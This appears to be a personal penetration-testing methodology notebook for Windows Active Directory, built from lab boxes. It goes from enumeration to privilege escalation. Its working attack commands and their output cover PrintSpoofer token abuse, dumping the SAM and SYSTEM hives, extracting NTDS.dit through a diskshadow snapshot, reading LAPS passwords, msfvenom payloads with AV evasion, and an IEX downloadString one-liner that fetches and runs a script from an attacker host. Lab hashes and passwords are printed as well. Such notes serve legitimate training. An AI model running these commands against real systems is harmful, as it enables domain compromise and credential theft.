# Windows && Active Directory Infiltration Methodology

### Active Directory Definitions
**`Active Directory`** - Microsoft implementation used for centralized system management. It performs user authentication, locates computers by name, applies policies to users and computers, locates services (MSSQL, DNS), and stores configuration data.

**`Domain Controller`** -  a server that runs Active Directory and its services, and provides authentication for the domain.

### Windows Definitions

**Execution Policy** — **Execution Policy** — a security control that limits which PowerShell scripts can run. Scopes: `MachinePolicy`, `UserPolicy`, `Process`, `CurrentUser`, `LocalMachine`.

|Policy|Description|
|---|---|
|`AllSigned`|All scripts (machine and local) must be signed by a publisher. Warns on unknown publishers.|
|`Bypass`|Nothing blocked, no warnings.|
|`Default`|`Restricted` on workstations, `machineSigned` on servers.|
|`machineSigned`|Downloaded scripts need a signature; locally written scripts don't.|
|`Restricted`|Only individual commands allowed; scripts blocked.|
|`Undefined`|No policy set for this scope. If all scopes are `Undefined`, `Restricted` applies.|
|`Unrestricted`|Default on non-Windows; allows unsigned scripts but warns.|

**Built-in Windows service accounts:**
- **LocalService** — minimum privileges (weaker than a standard user account); used by services that don't need internet access or credentials (appears anonymous on the LAN).
- **NetworkService** — restricted local privileges, but has network access; identified on the LAN as `DOMAIN\MACHINENAME$`.
- **LocalSystem** — the **highest** privilege level that exists on the local OS. Most services run under this by default (the least-privilege principle says they shouldn't, but they often do).

**Payload file types** (for delivery/execution once you have some level of access):

| Type       | Description                                                                                                                                                            |
| ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `.dll`     | Dynamic Linking Library — shared code/data used by multiple programs. Injecting a malicious DLL or hijacking a vulnerable one can elevate to SYSTEM and/or bypass UAC. |
| `.bat`     | Text-based DOS batch scripts for automating command-line tasks — e.g. open a port or call back to an attacker box.                                                     |
| `.vbs`     | VBScript — lightweight, dated scripting language; mostly relevant to phishing (e.g. malicious macros/cells triggering script execution).                               |
| `.msi`     | Windows Installer database format; craft a payload as `.msi` and run via `msiexec` for an elevated reverse shell.                                                      |
| PowerShell | Microsoft's modern shell + scripting language (built on .NET CLR). Most flexible option for gaining a shell/execution on a host.                                       |

---
# Enumeration (Global)

`ping <ip>` and compare the TTL against a [TTL reference table](https://subinsb.com/default-device-ttl-values/) for a quick OS guess.

```bash                                     
sudo nmap -sV -sC --script=banner --reason -p- <ip>       # full port scan + versions
sudo nmap --script=discovery -p <port(s)>/-p- -O <ip>     # discovery scan — very noisy, very thorough
```
1. Determine OS 
2. Determine Hostname
3. Determine FQDN / Domain Controller*

## External OS Enumeration:
```bash
# 1. TCP/IP Stack Fingerprinting
# Analyzes raw TCP/IP packet responses to guess the operating system.
sudo nmap -O --osscan-guess <Target_IP>

# 2. SMB Protocol Negotiation
# Extracts exact OS name, build number, domain, and architecture over SMB.
nxc smb <Target_IP>

# 3. MSRPC Null Session Query
# Connects anonymously via RPC to retrieve system server information (srvinfo).
rpcclient -U "" -N <Target_IP> -c "srvinfo"

# 4. HTTP Header Banner Grabbing
# Inspects the HTTP 'Server' header to map the IIS web server version to the underlying Windows OS.
curl -I http://<Target_IP>
```
## Per-Service Enumeration
**Per-service follow-up (once ports are known):**
1. Enumerate each service individually for version-specific vulnerabilities:
    - Metasploit modules by version
    - ExploitDB / `searchsploit` by version
    - Nmap script output (e.g. anonymous login flags)
    - Google: `"<service> <version> exploit github"`
    - **Document every discovered vulnerability.**
2. File share protocols worth checking: FTP, SMB, NFS (`showmount -e <ip>`).
3. Management protocols worth checking: IPMI, SNMP (`onesixtyone` → `snmpwalk`, UDP), Oracle TNS.
4. Cross-check both Metasploit and ExploitDB for CVEs matching the discovered OS build — compare against [Microsoft's CVE list](https://www.cvedetails.com/vendor/26/Microsoft.html).

# Active Directory Enumeration 
The easiest way to determine if a target possesses Active Directory is by checking its open ports.

### Minimum Domain Controller Requirements

* **DNS** (`53` TCP/UDP) – DNS resolution across the entire Active Directory domain.
* **Kerberos** (`88` TCP/UDP) – Primary authentication protocol used in AD.
* **RPC** (`135` TCP) – Remote Procedure Call Endpoint Mapper service.
* **LDAP** (`389` TCP/UDP) – Lightweight Directory Access Protocol for directory lookups.
* **Kerberos Password Change** (`464` TCP/UDP) – Handles user password change and reset operations.
* **SMB** (`445` TCP) – Server Message Block used for network file sharing and IPC.
* **LDAP Global Catalog** (`3268` / `3269` TCP) – Global Catalog queries (`3268` unencrypted / `3269` encrypted).

**`Lightweight Directory Access Protocol (LDAP)`** — a protocol that provides access to Active Directory's centralized database, allowing queries and modifications against objects such as: usernames, groups, distinguished names (DNs), computers, organizational units (OUs), permissions, group policies, and their attributes.

**`Offensive Vector:`** Since LDAP is often queryable, we can attempt an anonymous bind — authenticating without any credentials (empty username and password fields) — to see if the directory permits unauthenticated access. If successful, we can expose valuable information about the Active Directory structure, which could be exfiltrated and used for further attacks. **THIS SERVICE IS A PRIMARY ENUMERATION TARGET!**

```bash
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: machine.htb, Site: Default-First-Site-Name)
```
######  user query  /  query all objects
```bash
nxc ldap <ip>/<FQDN> --users / --users-export <file>
nxc ldap machineDC.machine.vl -u '' -p '' --query "(sAMAccountName=*)" ""
nxc ldap machineDC.machine.vl -u '' -p '' --query "(objectClass=*)" "" | grep "Response for object:"
```
######  DNs grepping

**`Distinguished names (DNs)`** - the unique identifier of an object and its exact location within LDAP and Active Directory, made up of the following components:

| Prefix | Meaning                                                                                                                                       | Example               |
| ------ | --------------------------------------------------------------------------------------------------------------------------------------------- | --------------------- |
| `CN`   | Common Name                                                                                                                                   | `CN=Administrator`    |
| `OU`   | Organizational Unit (folder-like container)                                                                                                   | `OU=IT`, `OU=Servers` |
| `DC`   | **Domain Component** (a single label of the domain name, split at each dot — _not_ "Domain Controller"; unrelated meaning, same abbreviation) | `dc=machine,dc=vl`       |
| `CN`   | Can also represent groups, computers, policies                                                                                                | `CN=Domain Admins`    |
| `CN`   | Can also represent objects like groups, computers, policies                                                                                   | `CN=Domain Admins`    |

**`ldapsearch`** - a tool used to query LDAP (can easily be replaced with NXC).
```bash
ldapsearch -x   # use simple authentication
	-b          # Base DN specification (tree starting point)
	"*"         # shorthand of (objectClass=*) (means match every object)
	-H ldap://  # connect to..
```
```bash
ldapsearch -x -b "dc=...,dc=..." "*" -H ldap://machineDC.machine.vl | awk -F ': ' '/^dn:/{print $2}' | cut -d "=" -f2  | tail -11 | cut -d "," -f1 | tr " " "."
```

###### File Share Enumeration
**`SMB`** - take a look on the file share using `guest credentials`
```bash
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?

Host script results:
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-31T15:24:46
|_  start_date: N/A
```

```bash
smbclient -NL <ip>                    # list shares
smbclient //<ip>/<share> -U guest%    # use guest credentials
```
###### Server Enumeration
Also it is worth to check **`machine procedure call`** records
```bash
rpcclient -U "%" <target>   # using anonymous access
```
``` bash
srvinfo                      # server information
enumdomains                  # enumerate ALL domains deployed in the network
enumdomusers                 # enumerate all users
querydominfo                 # server, user, domain info deployed on the target
queryuser <RID>              # displays all information about selected user
querygroup                   # all info about selected group
netsharegetinfo <share>      # info about specific share
```

---

# Footprint
1. **INVESTIGATE!** Look at the files obtained earlier (e.x from shares).
		What they are representing? Why you can exfiltrate from them?
		Can you access / use them? Find out their purpose. Look for the Details

2. **Alternative Method: Vulnerability Exploitation**
Vulnerability identification (OS case)
3. Compare the discovered OS build against [Microsoft's CVE list](https://www.cvedetails.com/vendor/26/Microsoft.html).
4. Check Metasploit and ExploitDB for matching CVEs.
#### Building the payload
- **Metasploit (`msfvenom`)** — encode output with **DarkArmour** for AV evasion.
- **Mythic C2 framework** — more complex, alternate option.
- Payload extension choices: see the Windows definitions table (DLL / Batch / VBS / MSI / PowerShell).
#### Transfer & execution (goal: shell)
- **Impacket** — Python toolset for direct protocol interaction. Key tools: `psexec.py` (uploads a service binary via SMB, registers it with the Service Control Manager over RPC, creates a named pipe → semi-interactive shell), `smbclient.py`, `wmiexec.py`, Kerberos tooling, standalone SMB server.
- **SMB (with valid creds)** — access `C$`/`ADMIN$`: `smbclient //target/C$ -U user`, then `put` your payload.
- **Metasploit modules** — many auto-build/stage/execute payloads for you.
- **Other protocols** — FTP, TFTP, HTTP/S, etc.; check what's open for uploading. [Payloads All The Things — Windows Download & Execute](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md) has quick one-liners.

3. **LAST OPTION!** Based on the users: try to bruteforce every single user / try password spraying (using `nxc`)

###### Authentication Methods
```bash
evil-winrm-py -u <user> -p <password> -i <target>
evil-winrm-py -u <user> -H <hash> -i <target>
evil-winrm-py -u <user> --cert-pem <certificate.crt> --priv-key-pem <private.key> -i <target>
```
---

# Windows Local Enumeration Methodology
users/system → processes/tasks/network → permissions/policy (the things that actually gate escalation) → automated tooling as a final cross-check, not a starting point.

**Step 0 — Current user context**
```powershell
whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name               State          Description
SeRestorePrivilege           Enabled        Restore files and directories
SeDebugPrivilege             Enabled        Debug programs
SeChangeNotifyPrivilege      Enabled        Bypass traverse checking
SeImpersonatePrivilege       Enabled        Impersonate a client after authentication
SeCreateGlobalPrivilege      Enabled        Create global objects
SeIncreaseWorkingSetPrivilege Disabled      Increase a process working set
```

`SeChangeNotifyPrivilege` — bypasses directory traversal checks (rarely directly useful).
`SeImpersonatePrivilege` — allows impersonating others post-authentication; important for priv-esc (e.x. Potato-family exploits).

```powershell
whoami /groups
GROUP INFORMATION
-----------------
Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                                            Well-known group S-1-5-3       
```
**Step 1 — User & group enumeration (broaden outward)**
```powershell
net user <username>
Get-LocalUser -Name "username" | fl
Get-LocalGroup -Name "groupname" | fl
Get-CimInstance Win32_UserAccount -Filter "Name='John'" | Format-List *
```

**Step 2 — OS / system enumeration**
`compmgmt.msc` — GUI entry point for local users/groups, services, disks, event viewer.
```powershell
Get-ComputerInfo                                             # all possible info
Get-ComputerInfo -Property "OsName", "OsVersion", "OsArchitecture"
systeminfo                                                    # OS version, network, hardware, updates
wmic qfe                                                      # installed updates
```

Modern (`Get-CimInstance`) vs legacy (`Get-WmiObject`, PowerShell 3.0):
```powershell
Get-CimInstance -ClassName Win32_OperatingSystem   # system info
Get-CimInstance -ClassName Win32_Process           # running processes
Get-CimInstance -ClassName Win32_Service           # services
Get-CimInstance -ClassName Win32_BIOS              # BIOS info
```

**Step 3 — Process & task listing**
```powershell
# CMD
tasklist
tasklist /v
tasklist /svc          # process + PID + service

# PowerShell
Get-Process > file.txt
```

**Step 4 — Scheduled tasks**
```powershell
schtasks /query /fo LIST /v
```
```
TaskName: \\CorpBackupAgent
Next Run Time: 2/24/2025 3:38:46 PM
Task To Run: powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\ProgramData\CorpBackup\Scripts\backupprep.ps1
Run As User: Administrator
Repeat: Every: 0 Hour(s), 2 Minute(s)
```

**Flag for follow-up:** this task runs as `Administrator` and executes a script from a `ProgramData` path on a schedule — exactly the kind of entry worth checking permissions on next.

**Step 5 — Network enumeration (listening ports)**

```powershell
netstat -ano
```
```
Proto  Local Address          Foreign Address        State           PID
TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       408
TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
TCP    0.0.0.0:5986           0.0.0.0:0              LISTENING       4
TCP    10.129.19.109:3389     <local ip>:32874      ESTABLISHED     408
```

**Step 6 — File & path permissions**
```powershell
icacls "C:\ProgramData\CorpBackup\Scripts\backupprep.ps1"
```
```
Everyone:(I)(F)
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
BUILTIN\Users:(I)(RX)
```

**Tie-back to Step 4:** this is the same script the `CorpBackupAgent` scheduled task runs as `Administrator`. If `Everyone` had `(F)` (full control) instead of just `BUILTIN\Users:(I)(RX)`, that's a textbook scheduled-task-hijack path — worth practicing spotting read/execute vs. full control on privileged-run scripts.

**Step 7 — Automated enumeration (verification pass, not a starting point)**
```powershell
powershell "IEX(New-Object Net.WebClient).downloadString('http://<local ip>:8090/winPEASS.ps1')" > winpeas.txt
```

Run this **after** manual enumeration — good for catching what you missed, but relying on it first skips the reasoning practice (useful for CJCA/GCIH/CPTS-style methodology building).

**Suggested flow recap:** `whoami /priv` + `/groups` → user/group enum → system/OS enum → processes/tasks → scheduled tasks → network → execution policy → file permissions → WinPEAS as a final sweep.

**Step 8 — Final Enumeration**
Via `services.msc`, identify for each service:

1. Service name
2. Full path to the executable — **weak NTFS permissions on the destination directory let an attacker modify/replace the binary** 
3. Startup type / account it runs as most run as `LocalSystem` 


---
# Privilege Escalation Methods
1. Make sure that you enumerated the entire system
---
### Privilege Escalation Vector - SeImpersonatePrivilege
**`SeImpersonatePrivilege`** — a Windows User Right Assignment that authorizes a program to impersonate a client or service context following authentication. When assigned to a low-privileged or service account, an attacker can exploit this capability to steal high-privileged access tokens (such as `NT AUTHORITY\SYSTEM`), leading to Local Privilege Escalation (LPE). **In other words, it allows us to execute commands as another user if we have their security token.**

**`Potato family`** — a suite of Local Privilege Escalation (LPE) exploit tools (including _JuicyPotato_, _PrintSpoofer_, and _GodPotato_) designed to abuse `SeImpersonatePrivilege`. These tools coerce `SYSTEM`-level services into authenticating against an attacker-controlled local endpoint (via DCOM, RPC, or Named Pipes), capturing and impersonating the resulting token to gain elevated execution rights when the prerequisite system conditions are met.
#### Pre-Requirements:
1. `SeImpersonatePrivilege - Enabled`. Check user's privileges using next command:
```powershell
whoami /priv 
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
...
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
...
```

Alternatively, instead of performing manual checks, we can use the `SharpUp` audit tool — but keep in mind it produces an overwhelming amount of noise that can easily be detected by EDR. https://github.com/ghostpack/sharpup

```powershell
iwr http://<your ip>:<port>/Debug/SharpUp.exe -UseBasicParsing -OutFile SharpUp.exe
./SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===
[!] Modifialbe scheduled tasks were not evaluated due to permissions.
[+] Hijackable DLL: C:\inetpub\wwwroot\bin\AMD64\sqlceme40.dll
[+] Associated Process is w3wp with PID 1200 

=== Abusable Token Privileges ===
	SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED


=== Unattended Install Files ===
	C:\Windows\Panther\Unattend.xml


=== Modifiable Services ===
	[X] Exception: Exception has been thrown by the target of an invocation.
	[X] Exception: Exception has been thrown by the target of an invocation.
	[X] Exception: Exception has been thrown by the target of an invocation.
	Service 'UsoSvc' (State: Running, StartMode: Auto)



[*] Completed Privesc Checks in 2 seconds
```

2. Determine the system's version (as accurate as possible). 
###### Internal Enumeration:
```powershell
# 1. Quick Kernel Version
# Prints basic Windows NT kernel version string.
ver

# 2. Complete System Configuration
# Displays detailed OS configuration, hotfixes, memory, and hardware info.
systeminfo

# 3. WMI/CIM Query
# Retrieves core OS properties (Caption, Version, Service Pack, Architecture, Build Number).
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture, BuildNumber

# 4. Advanced Computer Information
# Detailed overview of OS Name, SKU, Version, Build Number, and Display Version.
Get-ComputerInfo | Select-Object OsName, OsOperatingSystemSKU, OsVersion, OsBuildNumber, OsDisplayVersion

# 5. Kernel File Metadata Inspection
# Reads file version directly from the Windows NT kernel binary (ntoskrnl.exe).
(Get-Item "$env:windir\System32\ntoskrnl.exe").VersionInfo.FileVersion

# 6. Registry Query
# Extracts exact Product Name, Display Version (e.g., 22H2), Current Build, and UBR (patch revision).
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | Select-Object ProductName, DisplayVersion, CurrentBuild, UBR
```

3.  Choose the exploit based on the acquired data and review its requirements: https://github.com/GauthamV309/SeImpersonate-Auditor

4. Compile the exploit:
```bash
git clone <repository>   # download the exploit
```
Open the project in Microsoft Visual Studio, load the `.sln` file, and change the compile properties to avoid errors: set **`Code Generation`** (Top Menu: `Project -> Properties`) to **`Multi-threaded (/MT)`**.  (depends)
![](<../Assets/Windows Methodology/Pasted image 20260804130049.png>)

Then press `Ctrl + Shift + B` to build the executable.

5. Retrieving file (PrintSpoofer.exe example):
Set up python web-server
```bash
python3 -m http.server <port>                                                            Serving HTTP on 0.0.0.0 port <port> (http://0.0.0.0:5001/) ...
```
Download the file:
```powershell
iwr http://<your ip>:<port>/PrintSpoofer.exe  -UseBasicParsing -OutFile PrintSpoofer.exe 
```
or

```powershell
wget http://<your ip>:<port>/PrintSpoofer.exe  -UseBasicParsing -OutFile PrintSpoofer.exe 
```
Executing it with the appropriate flags 
	(`-i` for opening another interactive session)
	(`-c` for executing command inside it)
```powershell
PS C:\Users\Public> ./PrintSpoofer.exe -i -c cmd.exe
./PrintSpoofer.exe -i -c cmd.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami 
whoami
nt authority\system
```

---
### Privilege Escalation Vector - SeBackupPrivilege
###### Dumping SAM
Interesting and useful links:
https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/tree/master
https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/tree/master/Notes

```powershell
C:\Users\Caroline.Robinson\Desktop> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
Core privileges:
	1. SeRestorePrivilege
	2. SeBackupPrivilege

**`SeBackupPrivilege`** — a privilege that allows a user to read files and directories, and to create backups, **regardless of** their security policies. **NOT NORMALLY GRANTED TO USERS!**

Technique scenario: 1. Copy and download the `SAM` hive of `HKLM` to a directory with write permissions. 2. Copy and download the `SYSTEM` hive of `HKLM` to a directory with write permissions. 3. Use `impacket-secretsdump` to dump all the hashes inside.

**`Security Account Manager (SAM)`** hive — a part of the Windows registry that **stores all information about _local accounts_**: usernames, security identifiers (SIDs), group memberships, and password hashes (NTLM hashes, stored as LM/NT hash pairs depending on configuration).

**`SYSTEM`** hive — stores hardware and system configuration data. **Critically**, it stores the **boot key** (`sys key`), which is used to **encrypt and decrypt the password hashes** stored in the **`SAM`**.

**`SeRestorePrivilege`** — bypasses **write** security controls, allowing modification, overwriting, or **replacement of any file or system object**.

---
```powershell
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> reg save hklm\sam sam.hive
The operation completed successfully.    # saving sam.hive
```
```powershell
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> reg save hklm\system system.hive
The operation completed successfully.    # saving system.hive
```

```powershell
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> download sam.hive ~/
Downloading C:\Users\Caroline.Robinson\Documents\sam.hive: 64.0kB [00:00, 285MB/s]                                                    
[+] File downloaded successfully and saved as: /home/lilith/sam.hive

evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> download system.hive ~/
Downloading C:\Users\Caroline.Robinson\Documents\system.hive: 19.6MB [00:23, 857kB/s]                                                 
[+] File downloaded successfully and saved as: /home/lilith/system.hive
```
##### impacket secretsdump.py 
**`secretsdump.py`** — uses the boot key (sys key) to decrypt and extract passwords and usernames from the `SAM` and `LSA` (Local Security Authority).
_**Process chain:**_ the boot key decrypts the `SAM` key, which then decrypts each user's hash.


```bash
sudo secretsdump.py -sam sam.hive -system system.hive LOCAL                                  
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```
However we have failed. 
```bash
nxc smb BABYDC.baby.vl -u Administrator -H 8d992faed38128ae85e95fa35868bb43 
SMB <ip> 445 BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) (Null Auth:True) 
SMB 10.129.20.55 445 BABYDC   [-] baby.vl\Administrator:8d992faed38128ae85e95fa35868bb43 STATUS_LOGON_FAILURE
```

###### (Dumping Domain Hashes)
If the SAM hashes didn't give us any necessary credentials, we can try to dump the entire Active Directory database, which contains information about its objects.

**`NTDS.dit`** — a file that contains domain hashes and can be decrypted using the `SYSTEM boot key` mentioned above. However, this file is locked, so we can't copy it directly. To work around this, we'll create a snapshot (shadow copy) of the drive using `diskshadow` (the Windows implementation for creating snapshots) with the script below.

**IMPORTANT!** We're able to do this only because of our current privileges: `SeRestorePrivilege` (bypasses write security checks) and `SeBackupPrivilege` (allows us to create backups).

`robocopy` with the `/b` switch is able to copy the domain hash database — `ntds.dit` — from `E:\Windows\NTDS`. The `/b` switch enables **backup mode**, which bypasses file and folder permission settings (Access Control Lists, or ACLs).

```bash
cat backup                                                         
set verbose on                              # detailed output
set metadata C:\Windows\Temp\test.cab       # save all metadata (initial properties)
set context persistent                      # persistent mean - copy will survive a reboot;                                                it won't be automaticaly clean up
add volume C: alias cdrive                  # createas and alias for C:
create
expose %cdrive% E:                          # takes the shadowcopy of the cdrive (C's allias)



unix2dos backup                             # converts unix format to the windows suitable
```

Transmitting file using local web-server:
```bash 
python3 -m http.server 9001  
```
```powershell
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> wget http://10.10.15.39:9001/backup -OutFile backup -UseBasicParsing # -UseBasicParsing for skipping HTML/DOM fetching by the  Internet Exproler 
```
Transmitting using `evil-winrm`:
```powershell
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> upload /home/lilith/backup .
Uploading /home/lilith/backup.txt: 100%
[+] File uploaded successfully as: C:\Users\Caroline.Robinson\Documents\backup.txt
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> ls


    Directory: C:\Users\Caroline.Robinson\Documents


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                                                                               
-a----         7/28/2026   7:27 AM            129 backup                                                                                                                              
-a----         7/28/2026   7:17 AM          49152 sam.hive                                                              
-a----         7/28/2026   7:17 AM       20480000 system.hive                                                           
```
Now we just ran `diskshadow` /s for creating frozen-zone (snapshot) and specifying script (shadow copy parameters) 
```bash

evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> diskshadow /s ./backup
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  7/28/2026 7:40:01 AM

-> set verbose on                             
-> set metadata C:\Windows\Temp\test.cab
-> set context persistent
-> add volume C: alias cdrive
-> create
Excluding writer "Shadow Copy Optimization Writer", because all of its components have been excluded.

* Including writer "Task Scheduler Writer":
	+ Adding component: \TasksStore

* Including writer "VSS Metadata Store Writer":
	+ Adding component: \WriterMetadataStore

...
The shadow copy was successfully exposed as E:\.
-> 
```
Using `robocopy /b` we just copy this file to the current location
```bash
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> robocopy /b E:\Windows\NTDS . ntds.dit
```

Then, after successful copying we just download it to our local machine 
```powershell
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> download ntds.dit .
Downloading C:\Users\Caroline.Robinson\Documents\ntds.dit: 100%
[+] File downloaded successfully and saved as: /home/lilith/ntds.dit
```
Same stuff, same actions - **BUT!** Now we are working with the priceless target - domain hashes.
```bash
secretsdump.py -ntds ntds.dit -system system.hive LOCAL                               
Impacket v0.14.0.dev0+20260611.171053.546f7acc - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
...
```
`Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::`, where `ee4457ae59f1e3fbd764e33d9cef123d` is the Administator's hash!

---

### Privilege Escalation Vector - LAPS (Local Administrator Password Solution)
**`Local Administrator (OS Architecture)`** — every machine has its own `local administrator` account. Any user permitted to run programs with high privileges does so as the local administrator (similar to root/sudo on Linux). Main idea: if the local administrator account is compromised, it can lead to **lateral movement** (same image and credentials across the entire network) and, potentially, compromise of the entire Active Directory.

**`Local Administrator Password Solution`** — a solution that automatically generates a unique, complex, random password for every machine on the network (either time-based or event-based). This effectively mitigates lateral movement and Pass-the-Hash attacks. Once generated, the password is stored securely in a dedicated Active Directory attribute — either as **ciphertext** (Modern LAPS) or **plaintext** (Legacy LAPS).

**`Modern LAPS Control:`** The encrypted password blob cannot simply be passed or read. To decrypt and view the plaintext string, an attacker must also compromise a user account that explicitly belongs to the designated **Authorized Decryptor** group.

##### Enumeration
```poweshell
net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

...

Local Group Memberships      *machine Management Use
Global Group memberships     *LAPS_Readers         *Domain Users         
The command completed successfully.
```
Group: `LAPS_Readers `
##### Manual Exploitation
```powershell
Get-ADComputer DC01 -property 'ms-mcs-admpwd' 
DistinguishedName : CN=DC01,OU=Domain Controllers,DC=machine,DC=htb
DNSHostName       : dc01.machine.htb
Enabled           : True
ms-mcs-admpwd     : }fBa}6zP;I34T-0)47fj%0C+
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName : 
```
`ms-mcs-admpwd` - attribute which stores LAPS (local administrator credentials)
##### Exploitation using Toolkit
https://github.com/leoloobeek/LAPSToolkit
```powershell
Get-LAPSComputers        # displays all computers with the enblead laps password expriation,                            and password if user has access
ComputerName       Password                 Expiration         
------------       --------                 ----------         
dc01.machine.htb }fBa}6zP;I34T-0)47fj%0C+ 08/05/2026 16:12:22

Find-LAPSDelegatedGroups  # parses all OUs to find to who LAPS read it permitted
OrgUnit                                    Delegated Groups      
-------                                    ----------------      
OU=Domain Controllers,DC=machine,DC=htb  machine\LAPS_Readers
OU=Servers,DC=machine,DC=htb             machine\LAPS_Readers
OU=Database,OU=Servers,DC=machine,DC=htb machine\LAPS_Readers
OU=Web,OU=Servers,DC=machine,DC=htb      machine\LAPS_Readers
OU=Dev,OU=Servers,DC=machine,DC=htb      machine\LAPS_Readers

Find-AdmPwdExtendedRights  # Parses each AD computer with LAPS read permissions
ComputerName       Identity               Reason   
------------       --------               ------   
dc01.machine.htb machine\LAPS_Readers Delegated
```
##### Exploitation using NetExec
```bash
nxc ldap <target's ip> -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M laps  
```

**`Possible Scenarios`**:
	1. If local administrator is compromised **only on the one machine**, lateral movement is possibly only for looking deep in the machine's memory attempting to find data and credentials of other users. Otherwise - it's impossible
	2. If user, which belongs to the `LAPS_Readers` global groups is compromised, attacker gains `master-key` of the entire Active Directory. Main mechanism: `LAPS_Reader` just Domain Controller for the keys of other Workstations (Toolkit or NetExec)
	`Get-ADComputer -Filter * -Properties 'ms-mcs-admpwd' | Select-Object Name, ms-mcs-admpwd` -     for asking about every local administrator password as a reader


---
### Privilege Escalation Vector — Service Misconfiguration 

`sevices.msc` - basic buit-in service management application, based on its information we can identify:
1. Service Name
2. Full Path to Executable File
	!!! **It possibly leads to privilege escalation**. If destination directory has weak NTFS permissions an attacker can simply modify or replace the file with malicious one.
3. Startup Time

![](<../Assets/Windows Methodology/Pasted image 20260603082152.png>)

![](<../Assets/Windows Methodology/Pasted image 20260603082154.png>)

**Notable built-in service accounts in Windows:**
- LocalService — minimum privileges (weaker than a standard user account); used for services that don't need internet access or credentials (appears anonymous on the LAN).
